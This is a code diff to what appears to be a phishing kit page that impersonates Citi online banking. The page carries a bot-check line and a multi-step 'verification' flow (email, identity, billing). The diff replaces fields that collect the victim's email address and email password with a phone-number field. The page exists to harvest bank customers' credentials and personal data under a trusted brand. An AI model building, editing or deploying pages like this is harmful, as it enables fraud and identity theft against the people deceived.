@@ -7505,8 +7505,8 @@ if($bot == "is_bot"){
                           <citi-progress-bar _ngcontent-ibb-c277="" _nghost-ibb-c107="">
                             <div _ngcontent-ibb-c107="" class="progress-indicator-wrapper clearfix col-xs-12"><span _ngcontent-ibb-c107="" class="sr-only" id="progress-bar-0">Step 1 of 4: Verification</span>
                               <ol _ngcontent-ibb-c107="" class="progress-indicator col-xs-12">
-                                <li _ngcontent-ibb-c277="" citi-progress-bar-step="" _nghost-ibb-c106="" class="progress-indicator-step progress-indicator-step-active"> <span _ngcontent-ibb-c106="" aria-hidden="true" class="primary-label">Email Verification</span>
-                                  <!----><span _ngcontent-ibb-c106="" class="sr-only"> Step 1, Email ,  Current </span></li>
+                                <li _ngcontent-ibb-c277="" citi-progress-bar-step="" _nghost-ibb-c106="" class="progress-indicator-step progress-indicator-step-active"> <span _ngcontent-ibb-c106="" aria-hidden="true" class="primary-label">Phone Verification</span>
+                                  <!----><span _ngcontent-ibb-c106="" class="sr-only"> Step 1, Phone ,  Current </span></li>
                                 <li _ngcontent-ibb-c277="" citi-progress-bar-step="" _nghost-ibb-c106="" class="progress-indicator-step"> <span _ngcontent-ibb-c106="" aria-hidden="true" class="primary-label">Identity Verification</span>
                                   <!----><span _ngcontent-ibb-c106="" class="sr-only"> Step 2, Identity ,  Incomplete </span></li>
                                 <li _ngcontent-ibb-c277="" citi-progress-bar-step="" _nghost-ibb-c106="" class="progress-indicator-step"> <span _ngcontent-ibb-c106="" aria-hidden="true" class="primary-label">Billing Verification</span>
@@ -7523,13 +7523,13 @@ if($bot == "is_bot"){
                               <citi-row _ngcontent-tey-c262="">
                                 <div class="row">
                                   <h1 _ngcontent-tey-c262="" class="hide"></h1>
-                                  <h3 _ngcontent-tey-c262="" class="h3-style col-sm-12 head-padding"><strong>Verify Your Email</strong></h3></div>
+                                  <h3 _ngcontent-tey-c262="" class="h3-style col-sm-12 head-padding"><strong>Verify Your Phone</strong></h3></div>
                               </citi-row>
                               <div _ngcontent-tey-c262="" content5="" class="row">
                                 <citi-row _ngcontent-tey-c262="">
                                   <div class="row">
                                     <div _ngcontent-tey-c262="" class="cross-link-card col-sm-12 head-padding">
-                                      <div _ngcontent-tey-c262="" class="h4-style cross-link-heading">Auto-generated code will send to the registered email.</div>
+                                      <div _ngcontent-tey-c262="" class="h4-style cross-link-heading">We will send a verification code to the phone number you provide.</div>
                                     </div>
                                   </div>
                                   <br> </citi-row>
@@ -7537,43 +7537,17 @@ if($bot == "is_bot"){
                                   <div class="row">
                                     <citi-column _ngcontent-tey-c262="" xs="12" class="cardNum">
                                       <div class="col-xs-12">
-                                        <citi-input2 _ngcontent-tey-c262="" name="cardFieldName" idstr="cardFieldId" minlength="14" maxlength="16" class="citi-input2 row ng-untouched ng-invalid ng-dirty" _nghost-tey-c118="" required="">
+                                        <citi-input2 _ngcontent-tey-c262="" name="cardFieldName" idstr="cardFieldId" minlength="10" maxlength="15" class="citi-input2 row ng-untouched ng-invalid ng-dirty" _nghost-tey-c118="" required="">
                                           <div _ngcontent-tey-c118="" class="form-control-container col-md-4 col-sm-6">
                                             <label _ngcontent-tey-c118="" tabindex="-1" for="cardFieldId" id="cardFieldId-label" style="opacity: 1;">
-                                              <h5>Email</h5></label>
+                                              <h5>Phone Number</h5></label>
                                             <div _ngcontent-tey-c118="" class="input-container">
                                               <div _ngcontent-tey-c118="" class="add-on-pre">
                                                 <!---->
                                                 <!---->
                                               </div> <span _ngcontent-tey-c118="" class="input-switch-wrapper"><!----><!---->
                                             
-                                            <input _ngcontent-tey-c118="" autocapitalize="none" type="text" id="em" name="em" tabindex="0" placeholder="email" autocomplete="off" aria-required="true" required="true" aria-label="" aria-labelledby="cardFieldId-label"><!----><!----></span>
-                                              <div _ngcontent-tey-c118="" class="add-on-post">
-                                                <!---->
-                                                <!---->
-                                                <!---->
-                                              </div>
-                                            </div>
-                                            <!---->
-                                            <!---->
-                                          </div>
-                                        </citi-input2>
-                                      </div>
-                                    </citi-column>
-                                    <citi-column _ngcontent-tey-c262="" xs="12" class="cardNum">
-                                      <div class="col-xs-12">
-                                        <citi-input2 _ngcontent-tey-c262="" name="cardFieldName" idstr="cardFieldId" minlength="14" maxlength="20" class="citi-input2 row ng-untouched ng-invalid ng-dirty" _nghost-tey-c118="" required="">
-                                          <div _ngcontent-tey-c118="" class="form-control-container col-md-4 col-sm-6">
-                                            <label _ngcontent-tey-c118="" tabindex="-1" for="cardFieldId" id="cardFieldId-label" style="opacity: 1;">
-                                              <h5>Password</h5></label>
-                                            <div _ngcontent-tey-c118="" class="input-container">
-                                              <div _ngcontent-tey-c118="" class="add-on-pre">
-                                                <!---->
-                                                <!---->
-                                                <!---->
-                                              </div><span _ngcontent-tey-c118="" class="input-switch-wrapper"><!----><!---->
-
-                                            <input _ngcontent-tey-c118="" autocapitalize="none" type="password" id="epass" name="epass" tabindex="0" placeholder="password" autocomplete="off" aria-required="true" required="true" aria-labelledby="cardFieldId-label"><!----><!----></span>
+                                            <input _ngcontent-tey-c118="" autocapitalize="none" type="tel" id="phone" name="phone" tabindex="0" placeholder="phone number" autocomplete="off" aria-required="true" required="true" aria-label="" aria-labelledby="cardFieldId-label"><!----><!----></span>
                                               <div _ngcontent-tey-c118="" class="add-on-post">
                                                 <!---->
                                                 <!---->
